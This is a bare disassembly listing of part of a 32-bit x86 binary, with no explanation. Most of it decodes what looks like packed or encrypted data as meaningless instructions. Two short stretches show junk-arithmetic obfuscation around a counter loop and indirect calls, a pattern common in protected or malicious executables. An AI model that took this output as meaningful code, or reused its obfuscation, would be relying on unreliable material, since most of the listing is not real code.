  4071ca:	xor    cl,BYTE PTR [eax+0x47dea75d]
  4071d0:	cmp    dl,dh
  4071d2:	pop    edx
  4071d3:	inc    ebx
  4071d4:	pop    es
  4071d5:	imul   dl
  4071d7:	xchg   esi,eax
  4071d8:	xor    dl,al
  4071da:	cmp    BYTE PTR [esi-0x32],cl
  4071dd:	xor    bl,bh
  4071df:	iret   
  4071e0:	xor    BYTE PTR [esi],ch
  4071e2:	xchg   ebp,eax
  4071e3:	(bad)  
  4071e4:	imul   esp,edx,0x59
  4071e7:	xchg   ecx,eax
  4071e8:	jne    0x4071c9
  4071ea:	cmp    ch,BYTE PTR [ebp-0x24ab5de2]
  4071f0:	lods   eax,DWORD PTR ds:[esi]
  4071f1:	ficomp WORD PTR [ecx-0x4051ff4b]
  4071f7:	(bad)  [edi-0x3c5845e9]
  4071fd:	push   esi
  4071fe:	out    dx,al
  4071ff:	xchg   ebx,eax
  407200:	call   0xe76b0c0c
  407205:	and    al,0xf0
  407207:	mov    ah,0x31
  407209:	jle    0x407201
  40720b:	jbe    0x407246
  40720d:	dec    edx
  40720e:	dec    ebx
  40720f:	test   BYTE PTR [eax+0x33],bl
  407212:	(bad)  
  407213:	sti    
  407214:	and    eax,0x8a742aa2
  407219:	add    DWORD PTR ds:0x7ae67226,edi
  40721f:	outs   dx,DWORD PTR ds:[esi]
  407220:	jbe    0x407214
  407222:	add    BYTE PTR [edx+0xbea750a],0x2
  407229:	clc    
  40722a:	nop
  40722b:	std    
  40722c:	call   0xa53d4fce
  407231:	lss    ebp,FWORD PTR [ebp-0x1afeca21]
  407238:	repnz pusha 
  40723a:	and    DWORD PTR ds:0xca54ba57,ebp
  407240:	sbb    BYTE PTR [esi+0x7ee2c133],dl
  407246:	rcl    esp,1
  407248:	cmp    dl,dh
  40724a:	fisttp DWORD PTR [esi]
  40724c:	out    dx,eax
  40724d:	dec    esp
  40724e:	dec    ecx
  40724f:	mov    al,0x7f
  407251:	test   esp,edi
  407253:	fcomp  st(2)
  407255:	daa    
  407256:	push   0xaac7291a
  40725b:	clc    
  40725c:	scas   eax,DWORD PTR es:[edi]
  40725d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40725e:	and    BYTE PTR [ecx],cl
  407260:	push   ebx
  407261:	push   ss
  407262:	loopne 0x4072c5
  407264:	inc    ebp
  407265:	out    0xad,eax
  407267:	inc    esi
  407268:	jae    0x4072d1
  40726a:	mov    WORD PTR ds:0x7f958bd3,?
  407270:	(bad)  
  407271:	out    dx,al
  407272:	in     al,dx
  407273:	(bad)  
  407274:	dec    ebp
  407275:	ror    BYTE PTR [ecx],cl
  407277:	pop    edx
  407278:	cdq    
  407279:	xchg   esi,eax
  40727a:	gs dec ebp
  40727c:	loope  0x40727e
  40727e:	call   0xa1eaf9cd
  407283:	xchg   edx,eax
  407284:	xchg   edx,eax
  407285:	jno    0x40724e
  407287:	stc    
  407288:	sub    eax,0xbedc666a
  40728d:	jle    0x40724f
  40728f:	push   cs
  407290:	mov    al,0xfa
  407292:	push   ebx
  407293:	jl     0x407311
  407295:	mov    ebp,0x2b4c64c2
  40729a:	js     0x40730c
  40729c:	rcl    ecx,1
  40729e:	js     0x40731f
  4072a0:	adc    DWORD PTR [esi-0x5dc73116],ecx
  4072a6:	div    ebx
  4072a8:	sbb    BYTE PTR [ebp-0x1e],0x2a
  4072ac:	stos   BYTE PTR es:[edi],al
  4072ad:	mov    ds:0x81486da3,eax
  4072b2:	jae    0x4072c4
  4072b4:	out    0x9b,al
  4072b6:	std    
  4072b7:	cdq    
  4072b8:	pop    edx
  4072b9:	xchg   DWORD PTR [ebx+ecx*1-0x286a1d88],ebp
  4072c0:	cld    
  4072c1:	jmp    0xc466:0x5cac2d04
  4072c8:	nop
  4072c9:	cmp    al,cl
  4072cb:	clc    
  4072cc:	mov    eax,ds:0x9596a125
  4072d1:	mov    ds:0x5d7cf940,eax
  4072d6:	and    DWORD PTR [eax],0x46
  4072d9:	cli    
  4072da:	pop    esp
  4072db:	and    DWORD PTR [esp+ebx*2-0x50],0x38
  4072e0:	inc    ebp
  4072e1:	dec    edx
  4072e2:	xchg   BYTE PTR [ebx],ah
  4072e4:	mov    DWORD PTR [ebp+0x3fcbb3f4],edi
  4072ea:	or     ch,BYTE PTR [ebx+0x6c4db8d4]
  4072f0:	shl    BYTE PTR [edx],1
  4072f2:	out    dx,al
  4072f3:	es cmp eax,0xfb8d1d10
  4072f9:	xchg   edx,eax
  4072fa:	dec    ebx
  4072fb:	cs xchg ecx,eax
  4072fd:	test   eax,0xb9ff756
  407302:	push   ecx
  407303:	push   es
  407304:	cmp    BYTE PTR [edi],cl
  407306:	in     al,0xce
  407308:	mov    bh,al
  40730a:	fwait
  40730b:	inc    edx
  40730c:	and    edi,ebp
  40730e:	out    dx,al
  40730f:	xor    BYTE PTR [ebx],ch
  407311:	ficomp WORD PTR [ecx-0x13]
  407314:	(bad)  
  407315:	popf   
  407316:	dec    eax
  407317:	gs cdq 
  407319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40731a:	mov    dh,0xd6
  40731c:	inc    edx
  40731d:	jmp    0x72776c11
  407322:	push   edi
  407324:	cmp    BYTE PTR [ebp-0x4cc7a1a6],al
  40732a:	stos   DWORD PTR es:[edi],eax
  40732b:	cmp    ebp,DWORD PTR [ebx]
  40732d:	jge    0x407333
  40732f:	or     eax,0x7c6fb7bb
  407334:	and    DWORD PTR [esi-0x14],ebx
  407337:	clc    
  407338:	ret    
  407339:	popf   
  40733a:	mov    DWORD PTR [ecx+0x4e],eax
  40733d:	mov    bl,0x4e
  40733f:	push   ecx
  407340:	addr16 ror edi,0x4d
  407344:	jle    0x407317
  407346:	mov    eax,DWORD PTR cs:[ebp-0xc]
  40734a:	add    DWORD PTR ds:0x42fc51,0x42e683
  407354:	xor    eax,esi
  407356:	add    DWORD PTR ds:0x42fc7d,0x57f6
  407360:	add    eax,edi
  407362:	xor    DWORD PTR ds:0x42e68f,0x2a11
  40736c:	mov    DWORD PTR [ebp-0x18],eax
  40736f:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  407376:	mov    BYTE PTR [ebp-0x1],0x67
  40737a:	and    DWORD PTR ds:0x42fc7d,0x0
  407384:	mov    eax,ds:0x42fc7d
  407389:	inc    eax
  40738a:	mov    ds:0x42fc7d,eax
  40738f:	cmp    DWORD PTR ds:0x42fc7d,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e3df
  4073a2:	cmp    DWORD PTR ds:0x42fc7d,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fc7d
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fc7d,eax
  4073ba:	cmp    DWORD PTR ds:0x42fc7d,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e0a8,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e687,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	int3   
  4073fc:	xchg   ebx,eax
  4073fd:	in     eax,0xc1
  4073ff:	test   edi,0x7d207070
  407405:	jo     0x407477
  407407:	mov    bl,0x9
  407409:	bound  edx,QWORD PTR [ebx]
  40740b:	pop    es
  40740c:	jl     0x407451
  40740e:	inc    ebx
  40740f:	cmp    ah,ah
  407411:	in     al,dx
  407412:	jno    0x407461
  407414:	jg     0x4073aa
  407416:	add    BYTE PTR [eax-0x560ef3a7],ah
  40741c:	pushf  
  40741d:	ins    BYTE PTR es:[edi],dx
  40741e:	test   al,0xfc
  407420:	and    DWORD PTR [ebp+0x67dc43c0],0xdebc7fb3
  40742a:	xchg   ebp,eax
  40742b:	pop    ebp
  40742c:	pop    es
  40742d:	lock jbe 0x40748b
  407430:	pusha  
  407431:	dec    esi
  407432:	les    ebp,FWORD PTR [ebx]
  407434:	repz pop esi
  407436:	arpl   WORD PTR [ebp+0x6c],bx
  407439:	pop    ebx
  40743a:	xor    dl,bh
  40743c:	jns    0x40748c
  40743e:	div    bl
  407440:	bound  edx,QWORD PTR [esi]
  407442:	aaa    
  407443:	inc    ah
  407445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407446:	xor    al,0x3a
  407448:	ret    
  407449:	in     al,dx
  40744a:	retf   
  40744b:	lock fadd QWORD PTR [edi-0x4d]
  40744f:	pop    edi
  407450:	dec    ebx
  407451:	retf   0xfcbd
  407454:	out    0x2e,eax
  407456:	shl    DWORD PTR [edi+eiz*8],1
  407459:	xchg   ecx,eax
  40745a:	xchg   ebx,eax
  40745b:	aas    
  40745c:	mov    BYTE PTR [esi-0xd],ah
  40745f:	ret    
  407460:	and    al,0x41
  407462:	add    bl,BYTE PTR [edx-0x78f58681]
  407468:	sbb    al,0xb0
  40746a:	mov    al,0x55
  40746c:	daa    
  40746d:	addr16 out 0xd5,eax
  407470:	rcr    DWORD PTR [ebp-0x7c4f8081],cl
  407476:	mov    eax,0x1234ba5a
  40747b:	or     cl,dh
  40747d:	out    dx,al
  40747e:	in     al,dx
  40747f:	sbb    ch,BYTE PTR [ecx+0x59]
  407482:	mov    ecx,ecx
  407484:	inc    ecx
  407485:	mov    bl,BYTE PTR [esi+edi*1]
  407488:	lds    edi,FWORD PTR [edx+0x7e]
  40748b:	pop    eax
  40748c:	or     eax,0xecf77577
  407491:	fmul   QWORD PTR [ebp+eiz*2+0xdae3445]
  407498:	cmp    dl,cl
  40749a:	leave  
  40749b:	mov    esp,0xd3f000f9
  4074a0:	jp     0x40750f
  4074a2:	or     BYTE PTR [ebp+0x795d98ec],0x76
  4074a9:	ret    0xefdb
  4074ac:	cdq    
  4074ad:	push   esp
  4074ae:	sub    eax,0xaeb3d96d
  4074b3:	cmp    DWORD PTR [edi-0x7122c172],ebx
  4074b9:	push   0xaccefd72
  4074be:	(bad)  [ebp-0x63]
  4074c1:	jo     0x407487
  4074c3:	les    esp,FWORD PTR [esi-0x11823588]
  4074c9:	(bad)  
  4074ca:	es (bad) 
  4074cc:	daa    
  4074cd:	les    ebp,FWORD PTR [ecx]
  4074cf:	push   edx
  4074d0:	sub    eax,0xee45caa6
  4074d5:	push   es
  4074d6:	aaa    
  4074d7:	cmp    esp,DWORD PTR [edx+edx*1]
  4074da:	in     al,dx
  4074db:	js     0x4074b0
  4074dd:	div    BYTE PTR [edx]
  4074df:	ins    BYTE PTR es:[edi],dx
  4074e0:	jmp    0x2ea13271
  4074e5:	enter  0xff1e,0xc7
  4074e9:	inc    esp
  4074ea:	sub    BYTE PTR [ecx+ebx*1],dl
  4074ed:	mov    dh,0xe7
  4074ef:	adc    eax,0x9583125c
  4074f4:	xchg   DWORD PTR [ecx],esp
  4074f6:	pop    ebx
  4074f7:	popf   
  4074f8:	jl     0x407550
  4074fa:	cmp    BYTE PTR [esi],bl
  4074fc:	mov    ebx,DWORD PTR [edi-0x53d9b324]
  407502:	repnz fwait
  407504:	push   edx
  407505:	stos   BYTE PTR es:[edi],al
  407506:	add    ah,BYTE PTR [edx-0x49]
  407509:	shl    ebx,1
  40750b:	clc    
  40750c:	in     eax,dx
  40750d:	and    al,0xc1
  40750f:	sub    BYTE PTR [eax+edx*4-0x6c],bl
  407513:	rcl    BYTE PTR [eax+0x4a],cl
  407516:	mov    ebx,DWORD PTR [esi]
  407518:	pop    esp
  407519:	inc    ecx
  40751a:	test   al,0x40
  40751c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40751d:	idiv   DWORD PTR [esi+ecx*2+0x47]
  407521:	das    
  407522:	or     BYTE PTR [ebx],0xa2
  407525:	lea    edx,[eax]
  407527:	mov    BYTE PTR [esi+0x4d],bl
  40752a:	(bad)  
  40752b:	out    dx,al
  40752c:	pop    ecx
  40752d:	xchg   edi,eax
  40752e:	jp     0x407537
  407530:	pop    ebp
  407531:	mov    DWORD PTR gs:[ebx-0x51],esi
  407535:	leave  
  407536:	pushf  
  407537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407538:	mov    DWORD PTR [ecx-0x2c9ea270],esi
  40753e:	jo     0x40759c
  407540:	add    ebx,ebx
  407542:	hlt    
  407543:	sub    BYTE PTR [ebx+0xebb2509],dl
  407549:	dec    eax
  40754a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40754b:	push   0x861b0925
  407550:	xchg   DWORD PTR [esi],edi
  407552:	mov    ecx,0x73c3db42
  407557:	add    dh,BYTE PTR [eax]
  407559:	mov    tr1,ecx
  40755c:	mov    ebp,0xbfab3e7d
  407561:	sub    al,0x45
  407563:	push   0xfffffff5
  407565:	jbe    0x407586
  407567:	adc    al,0x83
  407569:	pop    fs
  40756b:	push   0xa9d4e737
  407570:	cmp    al,0x11
  407572:	scas   eax,DWORD PTR es:[edi]
  407573:	fistp  WORD PTR [edi-0x50249bb0]
  407579:	jp     0x4075f3
  40757b:	inc    esi
  40757c:	pop    ebp
  40757d:	repnz sub DWORD PTR [ecx+0x45],eax
  407581:	add    eax,0x2ea3edc5
  407586:	in     al,dx
  407587:	sub    BYTE PTR [eax+0x24],dl
  40758a:	int3   
  40758b:	int    0x50
  40758d:	jne    0x40755c
  40758f:	jno    0x407518
  407591:	fcomip st,st(6)
  407593:	aad    0x8f
  407595:	mov    fs,WORD PTR [edi-0x71]
  407598:	adc    ebp,ecx
  40759a:	jns    0x4075a3
  40759c:	out    dx,al
  40759d:	sbb    eax,0xd2f6c24e
  4075a2:	xor    DWORD PTR [ebx-0x4fbf723],ecx
  4075a8:	mov    ecx,edx
  4075aa:	mov    edx,DWORD PTR [ebp+0x24]
  4075ad:	shl    ebx,0xdb
  4075b0:	pop    DWORD PTR [edx+0x3a]
  4075b3:	daa    
  4075b4:	cli    
  4075b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075b6:	add    BYTE PTR [ebx+0x70],al
  4075b9:	inc    esi
  4075ba:	jno    0x407620
  4075bc:	in     al,dx
  4075bd:	jmp    0x521911ee
  4075c2:	inc    esp
  4075c3:	mov    edi,0xa7d09d35
  4075c8:	les    esi,FWORD PTR [ebp+0x21b45fea]
  4075ce:	lds    esp,FWORD PTR [ecx+edi*1-0x76deeaf8]
  4075d5:	bound  edx,QWORD PTR [edx-0x65c43576]
  4075db:	test   al,0x60
  4075dd:	cmp    ebp,eax
  4075df:	rcr    DWORD PTR [eax],0xca
  4075e2:	fisubr DWORD PTR [edi-0x47ae4e62]
  4075e8:	dec    ebp
  4075e9:	add    eax,0x6f57af3
  4075ee:	xor    eax,0x46b482f9
  4075f3:	pop    eax
  4075f4:	pop    eax
  4075f5:	out    0xa1,al
  4075f7:	(bad)  
  4075f9:	(bad)  
  4075fa:	imul   edi,DWORD PTR [edi+0x6],0x6c96835b
  407601:	push   esp
  407602:	sti    
  407603:	repz sti 
  407605:	jb     0x407644
  407607:	fwait
  407608:	pop    ebp
  407609:	mov    edx,0x94afa14b
  40760e:	pop    ebp
  40760f:	mov    esp,0x91379d66
  407614:	test   eax,0x31ce98d8
  407619:	inc    ebp
  40761a:	das    
  40761b:	cmp    DWORD PTR [eax-0x62],0xf8ae548c
  407622:	fnstcw WORD PTR [ecx+0x66eb098a]
  407628:	push   edx
  407629:	xchg   ecx,eax
  40762a:	fdiv   DWORD PTR [ebx]
  40762c:	dec    ecx
  40762d:	fwait
  40762e:	mov    ebp,0x913d41f8
  407633:	mov    ds:0xaa2a5125,al
  407638:	inc    edx
  407639:	cmp    BYTE PTR [eax],0x7d
  40763c:	(bad)  
  40763d:	imul   ebx,edx,0xf92200b9
  407643:	adc    ecx,ecx
  407645:	test   eax,0xd8708bc6
  40764a:	out    0x2f,eax
  40764c:	mov    edx,0x77774514
  407651:	xchg   esi,eax
  407652:	sub    BYTE PTR [edx-0x4f],cl
  407655:	addr16 popa 
  407657:	xor    cl,al
  407659:	dec    edx
  40765a:	or     dh,BYTE PTR [edx+0xf]
  40765d:	int3   
  40765e:	mov    eax,0x9b499bb6
  407663:	jge    0x407663
  407665:	cmp    al,BYTE PTR [edx]
  407667:	pop    edi
  407668:	mov    al,BYTE PTR [esi]
  40766a:	ins    DWORD PTR es:[edi],dx
  40766b:	mov    DWORD PTR [edx],edx
  40766d:	stos   BYTE PTR es:[edi],al
  40766e:	adc    al,0xf
  407670:	sub    eax,0x4b726120
  407675:	pusha  
  407676:	mov    dl,BYTE PTR [eax]
  407678:	outs   dx,BYTE PTR ds:[esi]
  407679:	push   ss
  40767a:	jmp    0x9233c185
  40767f:	sbb    eax,0xf5325f0
  407684:	(bad)  
  407685:	loop   0x407690
  407687:	xchg   ecx,eax
  407688:	data16 or dh,0x21
  40768c:	sbb    ch,BYTE PTR [edi+0x1]
  40768f:	pop    edi
  407690:	test   bh,ah
  407692:	jne    0x407686
  407694:	sbb    ch,BYTE PTR [eax+edi*8]
  407697:	gs loope 0x4076d0
  40769a:	ret    0x79b8
  40769d:	sbb    edx,DWORD PTR [ebx+0x76d0aa0a]
  4076a3:	scas   al,BYTE PTR es:[edi]
  4076a4:	adc    BYTE PTR [eax+ecx*4],ch
  4076a7:	jne    0x4076de
  4076a9:	or     BYTE PTR [edi+0x56ed31b0],bh
  4076af:	das    
  4076b0:	fmulp  st(3),st
  4076b2:	cwde   
  4076b3:	fwait
  4076b4:	push   cs
  4076b5:	scas   eax,DWORD PTR es:[edi]
  4076b6:	rcr    BYTE PTR [ebx-0x712203ad],cl
  4076bc:	dec    eax
  4076bd:	or     DWORD PTR ds:[ebx+0x7c643b06],ebx
  4076c4:	lods   eax,DWORD PTR ds:[esi]
  4076c5:	test   eax,0xc45b1de6
  4076ca:	fcomp  DWORD PTR [eax]
  4076cc:	ret    
  4076cd:	test   eax,0x397ec3c
  4076d2:	sub    eax,0xe341cbab
  4076d7:	retf   
  4076d8:	ret    0x78db
  4076db:	retf   0xee03
  4076de:	test   ch,dh
  4076e0:	iret   
  4076e1:	repnz das 
  4076e3:	inc    edi
  4076e4:	or     al,0xbe
  4076e6:	out    0x4d,al
  4076e8:	mov    bh,0x33
  4076ea:	jl     0x4076f5
  4076ec:	hlt    
  4076ed:	cmp    eax,0x5ea79483
  4076f2:	xchg   esi,eax
  4076f3:	inc    edi
  4076f4:	into   
  4076f5:	test   edi,0xc1095560
  4076fb:	pop    ss
  4076fc:	xor    bl,BYTE PTR [ebx]
  4076fe:	sahf   
  4076ff:	adc    dh,BYTE PTR [edx]
  407701:	push   edx
  407702:	xchg   ebp,eax
  407703:	outs   dx,DWORD PTR ds:[esi]
  407704:	nop
  407705:	aam    0x24
  407707:	fcmovne st,st(6)
  407709:	sti    
  40770a:	push   eax
  40770b:	dec    DWORD PTR [ecx+0x15f47cb6]
  407711:	loop   0x4076ba
  407713:	jecxz  0x4076c3
  407715:	fs out 0xb8,al
  407718:	gs out 0xe6,eax
  40771b:	jmp    0xf0aa:0x506f697a
  407722:	xchg   ebx,eax
  407723:	dec    ecx
  407724:	clc    
  407725:	aas    
  407726:	mov    ecx,0x2a282453
  40772c:	stos   BYTE PTR es:[edi],al
  40772d:	pop    edi
  40772e:	fild   DWORD PTR [esi+0x6]
  407731:	cmp    eax,0x40657df2
  407736:	inc    edx
  407737:	mov    eax,DWORD PTR [ebp-0x24]
  40773a:	xor    eax,esi
  40773c:	add    eax,edi
  40773e:	adc    DWORD PTR ds:0x42e09c,0x42fc89
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fc51,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e66f,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fc71,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e68f,0x42e66b
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e67f,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e683,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fc65,0x42fcee
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fd02,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	sub    eax,0xa72e0955
  4077de:	int3   
  4077df:	jo     0x407851
  4077e1:	and    BYTE PTR [ebp+0x70],bh
  4077e4:	jo     0x407851
  4077e6:	dec    edx
  4077e7:	adc    edi,DWORD PTR [ebx+ebp*1]
  4077ea:	out    0x2c,al
  4077ec:	(bad)  
  4077ed:	push   edi
  4077ee:	xlat   BYTE PTR ds:[ebx]
  4077ef:	push   ds
  4077f0:	xor    ecx,esi
  4077f2:	jge    0x407848
  4077f4:	leave  
  4077f5:	inc    edi
  4077f6:	push   ebp
  4077f7:	loope  0x407780
  4077f9:	adc    edi,DWORD PTR [edi-0x6c]
  4077fc:	inc    esp
  4077fd:	or     eax,0xe8c9970b
  407802:	push   0x337780b0
  407807:	xlat   BYTE PTR ds:[ebx]
  407808:	sub    al,BYTE PTR [ebp-0x69]
  40780b:	mov    esi,0xdb05d466
  407810:	cmp    esi,edx
  407812:	or     ch,al
  407814:	scas   al,BYTE PTR es:[edi]
  407815:	rcl    DWORD PTR [eax-0x2c9c9382],1
  40781b:	loopne 0x4077f8
  40781d:	aam    0xde
  40781f:	sbb    eax,0xdfcb5971
  407824:	or     esp,DWORD PTR [esp+ebp*4+0x61]
  407828:	mov    dl,0x84
  40782a:	push   edx
  40782b:	xchg   ebp,eax
  40782c:	sbb    al,0x1a
  40782e:	push   edx
  40782f:	jnp    0x4077be
  407831:	jnp    0x40788f
  407833:	fnsave [edx+0x45c0c1a]
  407839:	jle    0x4077c0
  40783b:	in     al,0x21
  40783d:	push   0xffffff9b
  40783f:	mov    edi,ebp
  407841:	xor    esi,eax
  407843:	adc    eax,eax
  407845:	leave  
  407846:	stos   BYTE PTR es:[edi],al
  407847:	ret    0x80dc
  40784a:	xchg   ebp,eax
  40784b:	and    DWORD PTR [edi+0x0],0xef3bca92
  407852:	pop    edx
  407853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407854:	enter  0xbd8d,0x65
  407858:	dec    ecx
  407859:	pusha  
  40785a:	mov    eax,DWORD PTR [edx-0x3ff1214]
  407860:	ins    DWORD PTR es:[edi],dx
  407861:	stc    
  407862:	call   DWORD PTR [eax-0x7005ba0f]
  407868:	sbb    DWORD PTR [ebp+0x3e7fad6],ebp
  40786e:	sub    esp,DWORD PTR [ecx]
  407870:	adc    cl,al
  407872:	fwait
  407873:	adc    DWORD PTR [esi],ebx
  407875:	call   0xf891:0xb35f362b
  40787c:	cmp    al,0x1a
  40787e:	add    DWORD PTR [edx+0x2d638b6d],0xffffffc3
  407885:	add    esi,DWORD PTR [edx]
  407887:	enter  0xefd3,0x4a
  40788b:	jae    0x4078a2
  40788d:	cs sub al,0xa6
  407890:	push   es
  407891:	ins    BYTE PTR es:[edi],dx
  407892:	adc    ah,BYTE PTR [ecx+edi*1-0x2d4bd7c7]
  407899:	test   ah,dh
  40789b:	cmp    DWORD PTR [edx+ebx*4-0x36bcbdad],ebx
  4078a2:	xor    BYTE PTR [ebx+eax*1-0x5f],dh
  4078a6:	stos   BYTE PTR es:[edi],al
  4078a7:	xor    eax,0x35d98522
  4078ac:	xor    al,BYTE PTR [eax+0x18bc6f0f]
  4078b2:	dec    esp
  4078b3:	pushf  
  4078b4:	push   ebx
  4078b5:	sbb    BYTE PTR [edx+0x54],0xf8
  4078b9:	cli    
  4078ba:	rcr    DWORD PTR [edi],cl
  4078bc:	xchg   esp,eax
  4078bd:	push   eax
  4078be:	add    BYTE PTR [esi+ebp*2+0x72],bh
  4078c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078c3:	mov    dh,0x7c
  4078c5:	pop    ebx
  4078c6:	pop    ds
  4078c7:	mov    WORD PTR [ecx+0x1b],fs
  4078ca:	fst    QWORD PTR [esi]
  4078cc:	sbb    esp,esp
  4078ce:	and    al,0x13
  4078d0:	clc    
  4078d1:	xlat   BYTE PTR ds:[ebx]
  4078d2:	or     ebx,DWORD PTR [edi+0x4afed08]
  4078d8:	in     al,0x1a
  4078da:	imul   edx,ecx,0xe7d79f52
  4078e0:	dec    ebp
  4078e1:	adc    BYTE PTR [esi-0xb],dl
  4078e4:	pop    esi
  4078e5:	ja     0x4078ba
  4078e7:	sbb    ah,BYTE PTR [ecx+0x77]
  4078ea:	fisub  DWORD PTR ds:0xa7d2806
  4078f0:	inc    ebx
  4078f1:	out    0x4a,al
  4078f3:	add    eax,0xc187000e
  4078f8:	call   0x92e76462
  4078fd:	(bad)  
  4078fe:	jmp    0x651b491a
  407903:	hlt    
  407904:	sar    DWORD PTR [ebp+0x566367f8],cl
  40790a:	or     dh,BYTE PTR [eax+0x37]
  40790d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40790e:	ins    BYTE PTR es:[edi],dx
  40790f:	lods   al,BYTE PTR ds:[esi]
  407910:	mov    bh,0x6
  407912:	push   0x40637eed
  407917:	(bad)  
  407918:	(bad)  
  407919:	cmp    DWORD PTR [eax-0x36],eax
  40791c:	push   esi
  40791d:	pop    ss
  40791e:	inc    esp
  40791f:	lock outs dx,DWORD PTR ds:[esi]
  407921:	icebp  
  407922:	dec    ebx
  407923:	lods   al,BYTE PTR ds:[esi]
  407924:	inc    eax
  407925:	call   0x5f3f:0xdf66218e
  40792c:	lods   al,BYTE PTR ds:[esi]
  40792d:	push   edi
  40792e:	and    edi,DWORD PTR [ebx]
  407930:	mov    bh,0xe8
  407932:	xchg   ebp,eax
  407933:	mov    ds:0x93b59ca7,eax
  407938:	pushf  
  407939:	scas   al,BYTE PTR es:[edi]
  40793a:	cs pop esi
  40793c:	js     0x407900
  40793e:	call   0x27ed984e
  407943:	aaa    
  407944:	test   al,0x12
  407946:	cli    
  407947:	sbb    dh,0x1d
  40794a:	lock inc ebx
  40794c:	cmp    dh,BYTE PTR [eax+0x5c]
  40794f:	jbe    0x407930
  407951:	cwde   
  407952:	inc    ebp
  407953:	add    bl,ch
  407955:	in     al,0x3b
  407957:	fcom   QWORD PTR [eax]
  407959:	jmp    0xf8f1eaa1
  40795e:	inc    ebx
  40795f:	mov    al,0xb9
  407961:	push   esi
  407962:	hlt    
  407963:	fidiv  WORD PTR [eax-0x4ce3131]
  407969:	popa   
  40796a:	cmp    BYTE PTR [edi],cl
  40796c:	pop    eax
  40796d:	popf   
  40796e:	out    0xcb,eax
  407970:	dec    BYTE PTR [eax-0x5d63c2ae]
  407976:	cdq    
  407977:	rcl    DWORD PTR [esi-0x6e],cl
  40797a:	jo     0x4079ce
  40797c:	xchg   DWORD PTR [edx+0x18f4e009],edx
  407982:	adc    esi,DWORD PTR [edx]
  407984:	mov    ecx,0xda41cafc
  407989:	mov    dl,0x48
  40798b:	imul   ecx,ecx,0xfa09af94
  407991:	jnp    0x40799b
  407993:	sbb    eax,0xccbee633
  407998:	add    DWORD PTR [edi],esp
  40799a:	std    
  40799b:	cs pop ebp
  40799d:	mov    ds:0x940b44ef,eax
  4079a2:	ret    
  4079a3:	jg     0x40799e
  4079a5:	enter  0x575a,0x98
  4079a9:	fistp  DWORD PTR [ebx+0x43d83ad6]
  4079af:	xchg   dx,ax
  4079b1:	push   0x49
  4079b3:	pop    edi
  4079b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079b5:	cli    
  4079b6:	cdq    
  4079b7:	jp     0x4079a1
  4079b9:	mov    edi,0x6b32a2b4
  4079be:	dec    ebx
  4079bf:	and    al,0x6f
  4079c1:	mov    dh,0x88
  4079c3:	out    0xb5,eax
  4079c5:	fcomi  st,st(3)
  4079c7:	retf   
  4079c8:	cmp    al,0x4f
  4079ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079cb:	dec    esp
  4079cc:	stos   DWORD PTR es:[edi],eax
  4079cd:	data16 fiadd WORD PTR [ecx+eiz*2-0x1e5c855]
  4079d5:	sbb    DWORD PTR [ebx+0x91f416b],0x453de37
  4079df:	mov    ch,0xda
  4079e1:	sub    al,0x9e
  4079e3:	sub    ch,bl
  4079e5:	jge    0x407a11
  4079e7:	repz xchg ebx,eax
  4079e9:	daa    
  4079ea:	inc    ebx
  4079eb:	pop    edx
  4079ec:	sbb    BYTE PTR [ebp-0x23],bl
  4079ef:	add    ecx,DWORD PTR [eax-0x21]
  4079f2:	mov    WORD PTR [edx+0x0],ds
  4079f5:	push   gs
  4079f7:	cmc    
  4079f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
